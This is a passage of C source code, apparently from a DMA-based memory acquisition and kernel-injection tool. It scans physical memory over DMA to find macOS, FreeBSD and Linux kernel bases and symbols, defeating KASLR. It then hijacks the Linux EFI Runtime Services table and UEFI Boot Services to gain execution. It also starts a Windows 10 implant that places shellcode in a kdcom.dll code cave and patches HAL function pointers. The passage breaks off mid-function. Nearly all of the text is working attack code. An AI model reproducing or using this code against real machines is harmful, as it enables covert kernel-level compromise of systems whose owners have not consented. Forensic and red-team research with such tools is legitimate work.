        *pdwKernelBase = cKSlide * 0x00200000; // KASLR = ([RND:1..512] * 0x00200000)
        if(!DeviceReadDMA_Retry(ctxMain->hLC, *pdwKernelBase, 4096, pbPage)) {
            printf("KMD: Failed. Error reading address: 0x%08x\n", *pdwKernelBase);
            return FALSE;
        }
        if(KMD_MacOSIsKernelAddress(pbPage)) {
            for(i = 0x20; i < 0xfc0; i += 8) {
                if(*(PQWORD)(pbPage + i) == 0x0000747865745F5F && *(PQWORD)(pbPage + i + 0x10) == 0x0000004249485F5F) { // __text && __HIB
                    *pdwTextHIB = (DWORD)*(PQWORD)(pbPage + i + 0x20);
                    *pcbTextHIB = (DWORD)*(PQWORD)(pbPage + i + 0x28);
                    return TRUE;
                }
            }
        }
    }
    return FALSE;
}

_Success_(return)
BOOL KMD_MacOSKernelSeekSignature(_Out_ PSIGNATURE pSignature)
{
    const BYTE SIGNATURE_BCOPY[] = { 0x48, 0x87, 0xF7, 0x48, 0x89, 0xD1, 0x48, 0x89, 0xF8, 0x48, 0x29, 0xF0, 0x48, 0x39, 0xC8, 0x72 };
    DWORD i, dwKernelBase, dwTextHIB, cbTextHIB;
    PBYTE pbTextHIB;
    if(!KMD_MacOSKernelGetBase(&dwKernelBase, &dwTextHIB, &cbTextHIB)) {
        return FALSE;
    }
    cbTextHIB = (cbTextHIB + 0xfff) & 0xfffff000;
    pbTextHIB = LocalAlloc(0, cbTextHIB);
    if(!pbTextHIB) { return FALSE; }
    if(!DeviceReadDMA(dwTextHIB, cbTextHIB, pbTextHIB, NULL)) {
        LocalFree(pbTextHIB);
        return FALSE;
    }
    for(i = 0; i < cbTextHIB - 0x300; i++) {
        if(0 == memcmp(pbTextHIB + i, SIGNATURE_BCOPY, 16)) {
            Util_CreateSignatureMacOSGeneric(dwKernelBase, dwTextHIB + i, dwTextHIB + cbTextHIB - 0x300, pSignature);
            LocalFree(pbTextHIB);
            return TRUE;
        }
    }
    LocalFree(pbTextHIB);
    return FALSE;
}

//-------------------------------------------------------------------------------
// FreeBSD generic kernel seek below.
//-------------------------------------------------------------------------------

_Success_(return)
BOOL KMD_FreeBSDKernelSeekSignature(_Out_ PSIGNATURE pSignature)
{
    DWORD i, dwo_memcpy_str, dwo_strtab, dwa_memcpy;
    PBYTE pb64M = LocalAlloc(LMEM_ZEROINIT, 0x04000000);
    if(!pb64M) { return FALSE; }
    for(i = 0x01000000; i < 0x04000000; i += 0x01000000) {
        DeviceReadDMA(i, 0x01000000, pb64M + i, NULL);
    }
    // 1: search for string 'vn_open'
    i = 0;
    while(TRUE) {
        i++;
        if(i > 0x04000000 - 0x1000) { goto error; }
        if(0 == memcmp(pb64M + i, "\0vn_open", 9)) { break; }
    }
    dwo_memcpy_str = i + 1;
    i = i & ~3;
    // 2: scan backwards for base of strtab
    while(TRUE) {
        i -= 4;
        if(i < 0x1000) { goto error; }
        if(0 == *(PDWORD)(pb64M + i - 4)) {
            break;
        }
    }
    dwo_strtab = i;
    i = i - 8; // skip necessary
    // 3: scan backwards for 'vn_open' function address
    while(TRUE) {
        i -= 0x18;
        if(i < 0x1000) { goto error; }
        if(0 == *(PQWORD)(pb64M + i)) { goto error; }
        if(dwo_memcpy_str - dwo_strtab == *(PDWORD)(pb64M + i)) { break; }
    }
    dwa_memcpy = *(PDWORD)(pb64M + i + 8) & 0x7fffffff;
    // 4: create signature
    LocalFree(pb64M);
    Util_CreateSignatureFreeBSDGeneric(dwo_strtab, dwa_memcpy, pSignature);
    return TRUE;
error:
    LocalFree(pb64M);
    return FALSE;
}

//-------------------------------------------------------------------------------
// LINUX generic kernel seek below. Comes in two versions:
// 4.6- version that works with 32 and 64-bit addressing
// 4.8+ version that works with 64-bit addressing, 32-bit will work too if kernel is KASLRed <4GB.
//-------------------------------------------------------------------------------

DWORD KMD_LinuxFindFunctionAddr(_In_ PBYTE pb, _In_ DWORD cb, _In_ PKERNELSEEKER pS, _In_ DWORD cS)
{
    DWORD o, i, c = 0;
    for(o = 0; o < cb - 0x1000; o++) {
        for(i = 0; i < cS; i++) {
            if(!pS[i].aSeek && !memcmp(pb + o, pS[i].pbSeek, pS[i].cbSeek)) {
                pS[i].aSeek = o + 1;
                c++;
                if(c == cS) { return c; }
            }
        }
    }
    return c;
}

/*
* Locate function addresses in symtab with absolute addressing.
*/
VOID KMD_LinuxFindFunctionAddrTBL_Absolute(_In_ PBYTE pb, _In_ DWORD cb, _In_ PKERNELSEEKER pS, _In_ DWORD cS)
{
    DWORD o, i;
    for(o = 0x1000; o < cb - 0x1000; o = o + 8) {
        if(((*(PQWORD)(pb + o) & 0xffffffff00000000) == 0xffffffff00000000) && ((*(PQWORD)(pb + o - 8) & 0xffffffff00000000) == 0xffffffff00000000)) { // kernel addr ptr
            for(i = 0; i < cS; i++) {
                if(pS[i].aSeek && !pS[i].aTableEntry) {
                    if((*(PQWORD)(pb + o) & 0x1fffff) == (0x1fffff & pS[i].aSeek)) { // KASLR align on 2MB boundaries (0x1fffff)
                        if((*(PQWORD)(pb + o) & ~0x1fffff) != (*(PQWORD)(pb + o - 8)  & ~0x1fffff)) { // several tables may exists - skip symbol name table)
                            pS[i].aTableEntry = o;
                            pS[i].vaSeek = *(PQWORD)(pb + o);
                            pS[i].vaFn = *(PQWORD)(pb + o - 8);
                        }
                    }
                }
            }
        }
    }
}

_Success_(return)
BOOL KMD_LinuxFindFunctionAddrTBL_RelativeSymTabSearch(_In_ PBYTE pb, _In_ DWORD cb, _In_ DWORD cbStart, _In_ PKERNELSEEKER pS)
{
    DWORD o, oFn;
    for(o = cbStart; o < cb - 8; o += 4) {
        if(o + *(PDWORD)(pb + o + 4) + 4 == pS->aSeek) {
            oFn = o + *(PDWORD)(pb + o);
            if((oFn < 0x02000000) && !(oFn & 0xf) && (oFn != o)) {
                pS->aTableEntry = o;
                pS->aFn = oFn;
                return TRUE;
            }
        }
    }
    return FALSE;
}

/*
* Locate function addresses in symtab with relative addressing.
*/
VOID KMD_LinuxFindFunctionAddrTBL_Relative(_In_ PBYTE pb, _In_ DWORD cb, _Inout_updates_(cS) PKERNELSEEKER pS, _In_ DWORD cS)
{
    QWORD va, vaBase = (QWORD)-1;
    DWORD i, o, c = 0;
    // 1: Locate virtual address base of kernel by just scanning for lowest value
    //    of qualifying pointer - dirty but it seems to be working ...
    for(i = 0, o = pS->aSeek & ~0xf; o < cb - 8; o += 8) {
        va = *(PQWORD)(pb + o);
        if(((va & 0xffffffff80000fff) == (0xffffffff80000000)) && (va != 0xffffffff80000000)) {
            vaBase = min(vaBase, va & 0xffffffffffe00000);
            if(++i == 0x100) { break; }
        }
    }
    if(vaBase == (QWORD)-1) {
        return;
    }
    // 2: Locate relative addresses of functions from symtab and fix virtual addresses
    for(i = 0; i < cS; i++) {
        if(!pS[i].aSeek || pS[i].vaSeek) { continue; }
        if(!KMD_LinuxFindFunctionAddrTBL_RelativeSymTabSearch(pb, cb, ((pS[i].aSeek & ~0xf) - 0x00100000), pS + i)) { continue; }
        pS[i].vaSeek = vaBase + pS[i].aSeek;
        pS[i].vaFn = vaBase + pS[i].aFn;
    }
}

VOID KMD_LinuxFindFunctionAddrTBL(_In_ PBYTE pb, _In_ DWORD cb, _In_ PKERNELSEEKER pS, _In_ DWORD cS)
{
    KMD_LinuxFindFunctionAddrTBL_Absolute(pb, cb, pS, cS);
    KMD_LinuxFindFunctionAddrTBL_Relative(pb, cb, pS, cS);
}

#define CONFIG_LINUX_SEEK_BUFFER_SIZE       0x01000000
#define CONFIG_LINUX_SEEK_CKSLIDES          512
_Success_(return)
BOOL KMD_Linux46KernelSeekSignature(_Out_ PSIGNATURE pSignature)
{
    BOOL result = FALSE;
    KERNELSEEKER ks[2] = {
        { .pbSeek = (PBYTE)"\0kallsyms_lookup_name",.cbSeek = 22 },
        { .pbSeek = (PBYTE)"\0vfs_read",.cbSeek = 10 }
    };
    DWORD cKSlide, dwKernelBase;
    PBYTE pb = LocalAlloc(0, CONFIG_LINUX_SEEK_BUFFER_SIZE);
    if(!pb) { return FALSE; }
    for(cKSlide = 0; cKSlide < CONFIG_LINUX_SEEK_CKSLIDES; cKSlide++) {
        // calculate the kernel base (@16M if no KASLR, @2M offsets if KASLR).
        // read 16M of memory first, if KASLR read 2M chunks at top of analysis buffer (performance reasons).
        dwKernelBase = 0x01000000 + cKSlide * 0x00200000; // KASLR = 16M + ([RND:0..511] * 2M) ???
        if(cKSlide == 0) {
            DeviceReadDMA(dwKernelBase, 0x01000000, pb, NULL);
        } else {
            memmove(pb, pb + 0x00200000, CONFIG_LINUX_SEEK_BUFFER_SIZE - 0x00200000);
            DeviceReadDMA_Retry(
                ctxMain->hLC,
                (QWORD)dwKernelBase + CONFIG_LINUX_SEEK_BUFFER_SIZE - 0x00200000,
                0x00200000,
                pb + CONFIG_LINUX_SEEK_BUFFER_SIZE - 0x00200000);
        }
        if(2 == KMD_LinuxFindFunctionAddr(pb, CONFIG_LINUX_SEEK_BUFFER_SIZE, ks, 2)) {
            KMD_LinuxFindFunctionAddrTBL(pb, CONFIG_LINUX_SEEK_BUFFER_SIZE, ks, 2);
            if(ks[0].vaFn && ks[1].vaFn) {
                Util_CreateSignatureLinuxGeneric(dwKernelBase, ks[0].aSeek, ks[0].vaSeek, ks[0].vaFn, ks[1].aSeek, ks[1].vaSeek, ks[1].vaFn, pSignature);
                result = TRUE;
                break;
            }
        }
    }
    LocalFree(pb);
    return result;
}

QWORD KMD_Linux48KernelBaseSeek()
{
    PPAGE_STATISTICS pPageStat = NULL;
    BYTE pb[0x1000], pbCMPcc[0x400], pbCMP90[0x400], pbCMP00[0x100];
    QWORD qwA, qwAddrMax, i;
    BOOL isAuthenticAMD, isGenuineIntel;
    memset(pbCMPcc, 0xcc, 0x400);
    memset(pbCMP90, 0x90, 0x400);
    memset(pbCMP00, 0x00, 0x100);
    qwA = max(0x01000000, ctxMain->cfg.paAddrMin) & 0xffffffffffe00000;
    qwAddrMax = max(0x01000000, (ctxMain->dev.paMax - 0x01000000) & 0xffffffffffe00000);
    if(!PageStatInitialize(&pPageStat, qwA, qwAddrMax, "Scanning for Linux kernel base", FALSE, FALSE)) { return 0; }
    // Linux kernel uses 2MB pages. Base of kernel is assumed to have AuthenticAMD and GenuineIntel strings
    // in first page. First page should also end with at least 0x400 0x90's. 2nd page (hypercall page?) is
    // assumed to end with 0x100 0x00's.
    for(; qwA <= qwAddrMax; qwA += 0x00200000) {
        pPageStat->qwAddr = qwA;
        if(!LcRead(ctxMain->hLC, qwA, 0x400, pb)) {
            PageStatUpdate(pPageStat, qwA, 0, 512);
            continue;
        }
        PageStatUpdate(pPageStat, qwA, 512, 0);
        // Search for GenuineIntel and AuthenticAMD strings.
        isGenuineIntel = isAuthenticAMD = FALSE;
        for(i = 0; i < 0x400; i++) {
            isAuthenticAMD |= ((0x68747541 == *(PDWORD)(pb + i)) && (0x69746e65 == *(PDWORD)(pb + i + 8)) && (0x444d4163 == *(PDWORD)(pb + i + 16)));
            isGenuineIntel |= ((0x756e6547 == *(PDWORD)(pb + i)) && (0x49656e69 == *(PDWORD)(pb + i + 8)) && (0x6c65746e == *(PDWORD)(pb + i + 16)));
        }
        if(!isGenuineIntel || !isAuthenticAMD) {
            continue;
        }
        // Verify that page ends with 0x400 NOPs (0x90) or 0x400 0xCC.
        if(!LcRead(ctxMain->hLC, qwA, 0x1000, pb) || (memcmp(pb + 0xc00, pbCMP90, 0x400) && memcmp(pb + 0xc00, pbCMPcc, 0x400))) {
            continue;
        }
        // read kernel base +0x1000/+0x2000 (hypercall page?) and check that it ends with at least 0x100 0x00.
        // alternatively that it ends with a number of (0x90+0xC3)NOP+RET
        if(!LcRead(ctxMain->hLC, qwA + 0x1000, 0x1000, pb) || memcmp(pb + 0xf00, pbCMP00, 0x100)) {
            if(!LcRead(ctxMain->hLC, qwA + 0x2000, 0x1000, pb) || memcmp(pb + 0xf00, pbCMP00, 0x100)) {
                if(memcmp(pb + 0xfe0, pbCMP90, 0x1f)) {
                    continue;
                }
            }
        }
        PageStatClose(&pPageStat);
        return qwA;
    }
    PageStatClose(&pPageStat);
    return 0;
}

#define KMD_LINUX48SEEK_MAX_BYTES       0x02000000      // 32MB
VOID KMD_Linux48KernelSeekSignature_KallsymsFromKDBGetSym(_In_reads_(KMD_LINUX48SEEK_MAX_BYTES) PBYTE pb, _In_ PKERNELSEEKER pKDBGetSym, _Inout_ PKERNELSEEKER pKallsyms)
{
    DWORD o, aRel;
    // sloppy dism to find 1st CALL (guess it's to callsyms_lookup_name)
    if(pKDBGetSym->aFn > KMD_LINUX48SEEK_MAX_BYTES - 0x1000) { return; }
    for(o = 0; o < 0x60; o++) {
        if(pb[pKDBGetSym->aFn + o] == 0xE8) {
            aRel = pKDBGetSym->aFn + o + 5 + *(PDWORD)(pb + pKDBGetSym->aFn + o + 1);
            if(aRel < KMD_LINUX48SEEK_MAX_BYTES - 0x1000) {
                pKallsyms->aFn = aRel;
                pKallsyms->vaFn = pKDBGetSym->vaFn - pKDBGetSym->aFn + aRel;
                // fake copy sz info from KDBGetSym into Kallsyms; it's needed by signature creation
                pKallsyms->aSeek = pKDBGetSym->aSeek;
                pKallsyms->vaSeek = pKDBGetSym->vaSeek;
            }
        }
    }
}

_Success_(return)
BOOL KMD_Linux48KernelSeekSignature(_Out_ PSIGNATURE pSignature)
{
    BOOL result = FALSE;
    PBYTE pb = NULL;
    QWORD paKernelBase;
    PPAGE_STATISTICS pPageStat = NULL;
    KERNELSEEKER ks[3] = {
        { .pbSeek = (PBYTE)"\0kallsyms_lookup_name",.cbSeek = 22 },
        { .pbSeek = (PBYTE)"\0vfs_read",.cbSeek = 10 },
        { .pbSeek = (PBYTE)"\0kdbgetsymval",.cbSeek = 14 }
    };
    if(!(pb = LocalAlloc(0, KMD_LINUX48SEEK_MAX_BYTES))) { goto fail; }
    paKernelBase = KMD_Linux48KernelBaseSeek();
    if(!paKernelBase) { goto fail; }
    printf("\n");
    if(!PageStatInitialize(&pPageStat, paKernelBase, paKernelBase + KMD_LINUX48SEEK_MAX_BYTES, "Verifying Linux kernel base", FALSE, FALSE)) { goto fail; }
    PageStatUpdate(pPageStat, paKernelBase, 0, 0);
    DeviceReadDMA(paKernelBase, KMD_LINUX48SEEK_MAX_BYTES, pb, pPageStat);
    KMD_LinuxFindFunctionAddr(pb, KMD_LINUX48SEEK_MAX_BYTES, ks, 3);
    KMD_LinuxFindFunctionAddrTBL_Absolute(pb, KMD_LINUX48SEEK_MAX_BYTES, ks, 3);
    KMD_LinuxFindFunctionAddrTBL_Relative(pb, KMD_LINUX48SEEK_MAX_BYTES, ks, 3);
    if(!ks[0].vaFn && ks[2].vaFn) { // kdbgetsymval exists; but not kallsyms_lookup_name not located
        KMD_Linux48KernelSeekSignature_KallsymsFromKDBGetSym(pb, &ks[2], &ks[0]);
    }
    if(ks[0].vaFn && ks[1].vaFn) {
        Util_CreateSignatureLinuxGeneric(paKernelBase, ks[0].aSeek, ks[0].vaSeek, ks[0].vaFn, ks[1].aSeek, ks[1].vaSeek, ks[1].vaFn, pSignature);
        result = TRUE;
    }
    // fall-through
fail:
    PageStatClose(&pPageStat);
    LocalFree(pb);
    return result;
}

//-------------------------------------------------------------------------------
// LINUX EFI Runtime Services hijack.
//-------------------------------------------------------------------------------

_Success_(return)
BOOL KMDOpen_LinuxEfiRuntimeServicesHijack()
{
    BOOL result;
    QWORD i, o, qwAddrEfiRt;
    DWORD dwPhysAddrS2, dwPhysAddrS3, *pdwPhysicalAddress;
    BYTE pb[0x1000], pbOrig[0x1000], pbEfiRt[0x1000];
    PSIGNATURE pSignature = NULL;
    pSignature = LocalAlloc(LMEM_ZEROINIT, sizeof(SIGNATURE));
    if(!pSignature) { goto fail; }
    //------------------------------------------------
    // 1: Locate and fetch EFI Runtime Services table.
    //------------------------------------------------
    result = KMD_FindSignature_EfiRuntimeServices(&qwAddrEfiRt);
    if(!result) {
        printf("KMD: Failed. EFI Runtime Services not found.\n");
    }
    if((qwAddrEfiRt & 0xfff) + 0x88 > 0x1000) {
        printf("KMD: Failed. EFI Runtime Services table located on page boundary.\n");
        goto fail;
    }
    result = DeviceReadDMA_Retry(ctxMain->hLC, qwAddrEfiRt & ~0xfff, 0x1000, pbEfiRt);
    if(!result || !IS_SIGNATURE_EFI_RUNTIME_SERVICES(pbEfiRt + (qwAddrEfiRt & 0xfff))) {
        printf("KMD: Failed. Error reading EFI Runtime Services table.\n");
        goto fail;
    }
    //------------------------------------------------
    // 2: Fetch signature and original data.
    //------------------------------------------------
    Util_CreateSignatureLinuxEfiRuntimeServices(pSignature);
    *(PQWORD)(pSignature->chunk[3].pb + 0x28) = qwAddrEfiRt; // 0x28 == offset data_addr_runtserv.
    memcpy(pSignature->chunk[3].pb + 0x30, pbEfiRt + (qwAddrEfiRt & 0xfff) + 0x18, 0x70); // 0x30 == offset data_runtserv_table_fn.
    result = DeviceReadDMA_Retry(ctxMain->hLC, 0, 0x1000, pbOrig);
    if(!result) {
        printf("KMD: Failed. Error reading at address 0x0.\n");
        goto fail;
    }
    //------------------------------------------------
    // 3: Patch wait to reveive execution of EFI code.
    //------------------------------------------------
    DeviceWriteDMA_Retry(ctxMain->hLC, 0, 0x1000, pSignature->chunk[3].pb);
    for(i = 0; i < 14; i++) {
        o = (qwAddrEfiRt & 0xfff) + 0x18 + 8 * i; // 14 tbl entries of 64-bit/8-byte size.
        *(PQWORD)(pbEfiRt + o) = 0x100 + 2 * i; // each PUSH in receiving slide is 2 bytes, offset to code = 0x100.
    }
    DeviceWriteDMA_Retry(ctxMain->hLC, qwAddrEfiRt, 0x88 /* 0x18 hdr, 0x70 fntbl */, pbEfiRt + (qwAddrEfiRt & 0xfff));
    memset(pb, 0, 0x1000);
    pdwPhysicalAddress = (PDWORD)(pb + 0x20); // 0x20 == offset data_phys_addr_alloc.
    printf(
        "KMD: EFI Runtime Services table hijacked - Waiting to receive execution.\n"
        "     To trigger EFI execution take action. Example: 'switch user' in the\n"
        "     Ubuntu graphical lock screen may trigger EFI Runtime Services call.\n");
    do {
        Sleep(100);
        if(!DeviceReadDMA_Retry(ctxMain->hLC, 0, 0x1000, pb)) {
            Util_WaitForPowerCycle();
            printf("KMD: Resume waiting to receive execution.\n");
        }
    } while(!*pdwPhysicalAddress);
    dwPhysAddrS2 = *pdwPhysicalAddress;
    printf("KMD: Execution received - waiting for kernel hook to activate ...\n");
    //------------------------------------------------
    // 4: Restore EFI Runtime Services shellcode and move on to 2nd buffer.
    //------------------------------------------------
    LcWrite(ctxMain->hLC, 0, 0x1000, pbOrig);
    memset(pb, 0, 0x1000);
    printf("KMD: Waiting to receive execution.\n");
    do {
        Sleep(100);
        if(!DeviceReadDMA_Retry(ctxMain->hLC, dwPhysAddrS2, 0x1000, pb)) {
            printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
            goto fail;
        }
    } while(!*pdwPhysicalAddress);
    dwPhysAddrS3 = *pdwPhysicalAddress;
    //------------------------------------------------
    // 5: Clear 2nd buffer and set up stage #3.
    //------------------------------------------------
    memset(pb, 0, 0x1000);
    LcWrite(ctxMain->hLC, dwPhysAddrS2, 0x1000, pb);
    result = KMD_SetupStage3(dwPhysAddrS3, pSignature->chunk[4].pb, 4096);
    LocalFree(pSignature);
    return result;
fail:
    LocalFree(pSignature);
    return FALSE;
}

//-------------------------------------------------------------------------------
// Windows 8/10 generic kernel implant below.
//-------------------------------------------------------------------------------

_Success_(return)
BOOL KMD_Win_SearchTableHalpApicRequestInterrupt(_In_ PBYTE pbPage, _In_ QWORD qwPageVA, _Out_ PDWORD dwHookFnPgOffset)
{
    DWORD i;
    BOOL result;
    for(i = 0; i < (0x1000 - 0x78); i += 8) {
        result =
            ((*(PQWORD)(pbPage + i + 0x00) & 0xfffff00000000000) == 0xfffff00000000000) &&
            ((*(PQWORD)(pbPage + i + 0x10) & ~0xfff) == qwPageVA) &&
            ((*(PQWORD)(pbPage + i + 0x18) == 0x28) || (*(PQWORD)(pbPage + i + 0x18) == 0x30)) &&
            ((*(PQWORD)(pbPage + i + 0x78) & 0xffffff0000000000) == 0xfffff80000000000);
        if(result) {
            *dwHookFnPgOffset = i + 0x78;
            return TRUE;
        }
    }
    return FALSE;
}

_Success_(return)
BOOL KMDOpen_UEFI_FindEfiBase()
{
    PBYTE pb = NULL;
    PPAGE_STATISTICS pPageStat = NULL;
    DWORD dwAddrCurrent, dwAddrMax;
    QWORD o, qwAddr_BOOTSERV, qwAddr_RUNTSERV;
    printf("KMD: Searching for EFI BASE (no -efibase parameter supplied).\n");
    // initialize & allocate memory
    if(!(pb = LocalAlloc(0, 0x00100000))) { goto fail; }
    dwAddrCurrent = SIZE_PAGE_ALIGN_4K(ctxMain->cfg.paAddrMin);
    dwAddrMax = max(0xffffffff, SIZE_PAGE_ALIGN_4K(ctxMain->cfg.paAddrMax) - 1);
    if(!PageStatInitialize(&pPageStat, dwAddrCurrent, dwAddrMax, "Searching for EFI BASE", FALSE, FALSE)) { goto fail; }
    // loop EFI BASE (IBI SYST) find
    while(dwAddrCurrent <= dwAddrMax - 0x100000) {
        if(DeviceReadDMA(dwAddrCurrent, 0x100000, pb, pPageStat)) {
            for(o = 0; o < 0x100000 - 0x100; o += 8) {
                if(0x5453595320494249 != *(PQWORD)(pb + o)) { continue; } // IBI SYST
                qwAddr_BOOTSERV = *(PQWORD)(pb + o + 0x60);
                qwAddr_RUNTSERV = *(PQWORD)(pb + o + 0x58);
                if((qwAddr_BOOTSERV & 0xffffffff00000007) || (qwAddr_RUNTSERV & 0xffffffff00000007)) { continue; }
                if(!(qwAddr_BOOTSERV & 0xfffffff8) || !(qwAddr_RUNTSERV & 0xfffffff8)) { continue; }
                ctxMain->cfg.paEFI_IBI_SYST = dwAddrCurrent + o;
                pPageStat->szAction = "Waiting for KMD to activate";
                PageStatClose(&pPageStat);
                LocalFree(pb);
                return TRUE;
            }
        } else {
            PageStatUpdate(pPageStat, dwAddrCurrent + 0x100000ULL, 0, 0x100);
        }
        dwAddrCurrent += 0x100000;
    }
fail:
    PageStatClose(&pPageStat);
    LocalFree(pb);
    return FALSE;
}

_Success_(return)
BOOL KMDOpen_UEFI(_In_ BYTE bOffsetHookBootServices)
{
    BOOL result;
    BYTE pb[0x2000];
    QWORD qwAddrEFI_BOOTSERV, qwAddrEFI_RUNTSERV, qwAddrHookedFunction;
    QWORD qwAddrKMDDATA, qwAddrKMD;
    DWORD cb;
    qwAddrKMDDATA = 0x38000000; // Place KMD at a "random" address- Hopefully this works w/o having it overwritten.
    //------------------------------------------------
    // 1: Fetch IBI_SYST and BOOTSERV tables
    //------------------------------------------------
    if(!ctxMain->cfg.paEFI_IBI_SYST) {
        result = KMDOpen_UEFI_FindEfiBase();
        if(!result) {
            printf("KMD: Failed. EFI system table not found.\n");
            return FALSE;
        }
    }
    result = DeviceReadDMA_Retry(ctxMain->hLC, ctxMain->cfg.paEFI_IBI_SYST & ~0xfff, 0x2000, pb);
    result = result && (0x5453595320494249 == *(PQWORD)(pb + (ctxMain->cfg.paEFI_IBI_SYST & 0xfff)));
    qwAddrEFI_BOOTSERV = *(PQWORD)(pb + (ctxMain->cfg.paEFI_IBI_SYST & 0xfff) + 0x60);
    qwAddrEFI_RUNTSERV = *(PQWORD)(pb + (ctxMain->cfg.paEFI_IBI_SYST & 0xfff) + 0x58);
    result = result && qwAddrEFI_RUNTSERV && (0 == (qwAddrEFI_RUNTSERV & 0xffffffff00000007));
    result = result && qwAddrEFI_BOOTSERV && (0 == (qwAddrEFI_BOOTSERV & 0xffffffff00000007));
    if(!result) {
        printf("KMD: Failed. Error reading or interpreting memory #1 at: 0x%llx\n", ctxMain->cfg.paEFI_IBI_SYST);
        return FALSE;
    }
    result = LcRead(ctxMain->hLC, qwAddrEFI_BOOTSERV & ~0xfff, 0x2000, pb);
    result = result && (0x56524553544f4f42 == *(PQWORD)(pb + (qwAddrEFI_BOOTSERV & 0xfff)));
    qwAddrHookedFunction = *(PQWORD)(pb + (qwAddrEFI_BOOTSERV & 0xfff) + bOffsetHookBootServices);
    result = result && qwAddrHookedFunction && (0 == (qwAddrHookedFunction & 0xffffffff00000000));
    if(!result) {
        printf("KMD: Failed. Error reading or interpreting memory #2 at: 0x%llx :: 0x%llx\n", ctxMain->cfg.paEFI_IBI_SYST, qwAddrEFI_BOOTSERV);
        return FALSE;
    }
    //------------------------------------------------
    // 2: Prepare Patch
    //------------------------------------------------
    memset(pb, 0, 0x2000);
    Util_ParseHexFileBuiltin("DEFAULT_UEFI_X64", pb + 0x1000, 0x1000, &cb);
    *(PDWORD)(pb + 0x1004) = (DWORD)ctxMain->cfg.paEFI_IBI_SYST;
    *(PDWORD)(pb + 0x1008) = (DWORD)(qwAddrEFI_BOOTSERV + bOffsetHookBootServices);
    *(PDWORD)(pb + 0x100C) = (DWORD)qwAddrHookedFunction;
    //------------------------------------------------
    // 3: Patch
    //------------------------------------------------
    if(ctxMain->cfg.fVerbose) {
        printf("INFO: IBI SYST:   0x%08x\n", (DWORD)ctxMain->cfg.paEFI_IBI_SYST);
        printf("INFO: BOOTSERV:   0x%08x\n", (DWORD)qwAddrEFI_BOOTSERV);
    }
    result = DeviceWriteDMA_Retry(ctxMain->hLC, qwAddrKMDDATA, 0x2000, pb);
    if(!result) {
        printf("KMD: Failed. Failed writing to memory #1.\n");
        return FALSE;
    }
    qwAddrKMD = qwAddrKMDDATA + 0x1000;
    result = DeviceWriteDMA_Retry(ctxMain->hLC, qwAddrEFI_BOOTSERV + bOffsetHookBootServices, 8, (PBYTE)&qwAddrKMD);
    if(!result) {
        printf("KMD: Failed. Failed writing to memory #2.\n");
        return FALSE;
    }
    //------------------------------------------------
    // 4: Wait for execution
    //------------------------------------------------
    printf("KMD: Waiting to receive execution.\n");
    do {
        Sleep(100);
        if(!DeviceReadDMA_Retry(ctxMain->hLC, qwAddrKMDDATA, 0x1000, pb)) {
            printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
            return FALSE;
        }
    } while(KMDDATA_MAGIC != *(PQWORD)pb);
    //------------------------------------------------
    // 5: Retrieve Memory Map
    // (ugly to issue a 2nd unnecessary DMA write, but works to reuse code)
    //------------------------------------------------
    return KMD_SetupStage3((DWORD)qwAddrKMDDATA, pb + 0x1000, 0x1000);
}

/*
* Load a kernel module (KMD) into a Windows 10 system on which not both of
* Vt-d and Virtualization Based Security is enabled. This technique relies
* on analysis by MemProcFS (vmm.dll) which currently only is a Windows module.
* as a result the initial attack may currently only take place from Windows
* attackers.
* The technique puts the executable shellcode inside a code cave inside the
* .text section of kdcom.dll.
* It also patches HalBugCheckSystem to create a 'safe' landing function for
* for thread creation via PsCreateSystemThread.
* It also patches function pointer table in HAL heap to gain initial execution.
*/
_Success_(return)
BOOL KMDOpen_WINX64_2_VMM()
{
    BOOL result = FALSE;
    BYTE pbPage[0x1000];
    BYTE pbExec[0x800], pbExecVerify[0x800];
    DWORD cbExec = 0, cbMemMap = 0;
    QWORD i = 0, j;
    PVMMDLL_MAP_PTE pMemMap = NULL;
    DWORD cSections;
    PIMAGE_SECTION_HEADER pSections = NULL;
    QWORD vaBaseKdCom, vaBaseNtoskrnl;
    QWORD vaExec = 0, vaData = 0;
    QWORD vaHook, qwHookOrig;
    DWORD dwHookOffset;
    QWORD paData, paKMD = 0;
    QWORD qwTMP, vaHalBugCheckSystem;
    BYTE pbHalBugCheckSystem_Orig[16] = { 0 };
    // ------------------------------------------------------------------------
    // 1: Initialize MemProcFS/vmm.dll
    // ------------------------------------------------------------------------
    if(!Vmmx_Initialize(FALSE, FALSE)) {
        printf("KMD: Failed initializing required MemProcFS/vmm.dll\n");
        return FALSE;
    }
    // ------------------------------------------------------------------------
    // 2: Locate sections where to insert:
    //    code: (kdcom.dll '.text' section)
    //    data: (kdcom.dll '.data' section)
    //    hal.dll!HalBugCheckSystem (used for 'hook' to provide valid landing
    //             site for PsCreateSystemThread -> no security bugchecks...)
    // ------------------------------------------------------------------------
    vaBaseKdCom = VMMDLL_ProcessGetModuleBaseU(4, "kdcom.dll");
    vaBaseNtoskrnl = VMMDLL_ProcessGetModuleBaseU(4, "ntoskrnl.exe");
    vaHalBugCheckSystem = VMMDLL_ProcessGetProcAddressU(4, "hal.dll", "HalBugCheckSystem");
    if(!vaBaseKdCom || !vaBaseNtoskrnl || !vaHalBugCheckSystem) {
        printf("KMD: Failed vmm.dll!ProcessGetModuleBase (kdcom.dll/ntoskrnl.exe)\n");
        goto fail;
    }
    if(!VMMDLL_ProcessGetSectionsU(4, "kdcom.dll", NULL, 0, &cSections) || !cSections) {
        printf("KMD: Failed vmm.dll!ProcessGetSections (kdcom.dll) #1\n");
        goto fail;
    }
    pSections = LocalAlloc(LMEM_ZEROINIT, cSections * sizeof(IMAGE_SECTION_HEADER));
    if(!pSections) { goto fail; }
    if(!VMMDLL_ProcessGetSectionsU(4, "kdcom.dll", pSections, cSections, &cSections)) {
        printf("KMD: Failed vmm.dll!ProcessGetSections (kdcom.dll) #2\n");
        goto fail;
    }
    for(i = 0; i < cSections; i++) {
        if(!strcmp(".text", pSections[i].Name)) {
            vaExec = pSections[i].VirtualAddress + vaBaseKdCom + 0x800;
        }
        if(!strcmp(".data", pSections[i].Name)) {
            vaData = pSections[i].VirtualAddress + vaBaseKdCom + 0x800;
        }
    }
    if(!vaExec || !vaData) { goto fail; }
    VMMDLL_MemVirt2Phys(4, vaData, &paData);
    VMMDLL_MemRead(4, vaHalBugCheckSystem, pbHalBugCheckSystem_Orig, 16);
    // ------------------------------------------------------------------------
    // 3: Check if inject is already active!
    // ------------------------------------------------------------------------
